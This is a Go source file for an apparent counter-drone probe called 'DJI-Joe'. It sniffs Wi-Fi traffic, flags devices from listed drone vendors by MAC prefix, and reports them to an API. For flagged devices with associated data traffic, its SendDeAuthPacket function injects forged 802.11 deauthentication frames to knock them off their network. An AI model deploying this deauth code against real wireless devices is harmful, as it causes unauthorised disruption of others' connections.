package djijoe

import (
	"encoding/hex"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/apsdehal/go-logger"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

const PROGNAME string = "DJI-Joe"
const VERSION string = "0.1"

const NB_DEAUTH_PACKETS int = 10

var Log *logger.Logger
var do_loop bool
var Cfg Config

const (
	API_HEARTBEAT    = "/api/heartbeat"
	API_WAKEUP       = "/api/wakeup"
	API_SHUTDOWN     = "/api/shutdown"
	API_NEWDRONEINFO = "/api/info"
)

type Config struct {
	Interface           net.Interface
	Handle              *pcap.Handle
	Vendors             Vendors
	ApiEndpoint         string
	Verbosity           int
	InitialGpsLatitude  float64
	InitialGpsLongitude float64
}

func InitLogger(name string) *logger.Logger {
	_log, err := logger.New(name, 1, os.Stderr)
	if err != nil {
		panic(err)
	}

	return _log
}

func isFlaggedMac(hwaddr net.HardwareAddr) (bool, string) {
	target := []byte{hwaddr[0], hwaddr[1], hwaddr[2]}
	for _, vendor := range Cfg.Vendors {
		if vendor.HasPrefix(target) {
			return true, vendor.Name
		}
	}

	return false, ""
}

func SendDeAuthPacket(src gopacket.Packet) error {
	var buffer gopacket.SerializeBuffer
	var options gopacket.SerializeOptions

	dot11Layer := src.Layer(layers.LayerTypeDot11)
	dot11PacketSrc, _ := dot11Layer.(*layers.Dot11)

	radioLayer := &layers.RadioTap{}
	dot11 := &layers.Dot11{
		Address1: dot11PacketSrc.Address2,
		Address2: dot11PacketSrc.Address1,
	}
	deauth := &layers.Dot11MgmtDeauthentication{
		Reason: layers.Dot11ReasonAuthExpired,
	}

	buffer = gopacket.NewSerializeBuffer()
	gopacket.SerializeLayers(buffer, options,
		radioLayer, dot11, deauth)

	for idx := 0; idx < NB_DEAUTH_PACKETS; idx++ {
		err := Cfg.Handle.WritePacketData(buffer.Bytes())
		if err != nil {
			Log.FatalF("WritePacketData failed: %+v", err)
			return err
		}
	}

	Log.NoticeF("Sent DeAuth from %s to %s",
		hex.EncodeToString(dot11.Address1),
		hex.EncodeToString(dot11.Address2))

	return nil
}

func DjiGo() {
	var decoder gopacket.Decoder
	var ok bool

	decoder, ok = gopacket.DecodersByLayerName["RadioTap"]
	if !ok {
		Log.Error("Failed to get the RadioTap decoder")
		return
	}

	source := gopacket.NewPacketSource(Cfg.Handle, decoder)
	source.NoCopy = true
	source.DecodeStreamsAsDatagrams = true

	Log.Info("Starting to read packets")
	probe := new(Probe)
	probe.SetApiEndpoint(Cfg.ApiEndpoint)
	probe.SetGpsCoordinates(Cfg.InitialGpsLatitude, Cfg.InitialGpsLongitude)

	sigc := make(chan os.Signal, 1)
	signal.Notify(sigc, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		sig := <-sigc
		Log.InfoF("Got '%+v': stopping cleanly", sig)
		do_loop = false
		probe.State = PROBE_STATE_SHUTDOWN
	}()

	probe.Wakeup()

	do_loop = true
	for packet := range source.Packets() {
		if do_loop == false || probe.State == PROBE_STATE_SHUTDOWN {
			break
		}
		probe.NbBytesCollected += uint64(len(packet.Data()))

		// extract the 802.11 layer
		dot11Layer := packet.Layer(layers.LayerTypeDot11)
		if dot11Layer == nil {
			continue
		}

		var info DroneInfoMessage
		var isFlagged bool = false
		var vendor string = ""

		dot11Packet, _ := dot11Layer.(*layers.Dot11)

		if len(dot11Packet.Address2) != 6 {
			continue
		}

		isFlagged, vendor = isFlaggedMac(dot11Packet.Address2)
		if isFlagged == false {
			continue
		}

		info.MessageType = TYPE_UNDEFINED

		// we check if the packet is a 802.11 Beacon
		dot11MgmtLayer := packet.Layer(layers.LayerTypeDot11MgmtBeacon)
		if dot11MgmtLayer != nil {
			info.MessageType = TYPE_BEACON
			probe.NbBeacons++
		}

		// we check if the packet is a 802.11 ProbeRequest
		dot11MgmtLayer = packet.Layer(layers.LayerTypeDot11MgmtProbeReq)
		if dot11MgmtLayer != nil {
			info.MessageType = TYPE_PROBE_REQUEST
			probe.NbProbes++
		}

		// we check if it's a DATA packet (i.e. drone <-> AP already associated)
		dot11DataLayer := packet.Layer(layers.LayerTypeDot11WEP)
		if dot11DataLayer != nil {
			// if so, build and send DeAuth messages
			info.MessageType = TYPE_DATA
			err := SendDeAuthPacket(packet)
			if err != nil {
				Log.ErrorF("Error when sending DeAuth message: %+v", err)
			}
			continue
		}

		if info.MessageType == TYPE_UNDEFINED {
			continue
		}

		// process flagged MAC
		radioLayer := packet.Layer(layers.LayerTypeRadioTap)
		radioPacket, _ := radioLayer.(*layers.RadioTap)

		Log.NoticeF("Found 802.11 %s from vendor %s (device %s) - strength=%d dBm - frequency=%d MHz",
			MessageTypeToString(info.MessageType),
			vendor,
			hex.EncodeToString(dot11Packet.Address2),
			radioPacket.DBMAntennaSignal,
			radioPacket.ChannelFrequency,
		)

		info.Hostname = probe.Hostname
		info.Timestamp = time.Now()
		info.MacAddress = dot11Packet.Address2
		info.SignalStrength = radioPacket.DBMAntennaSignal
		info.Frequency = uint16(radioPacket.ChannelFrequency)
		info.Vendor = vendor

		probe.ProcessFlaggedPacket(info)
	}

	probe.Shutdown()
}
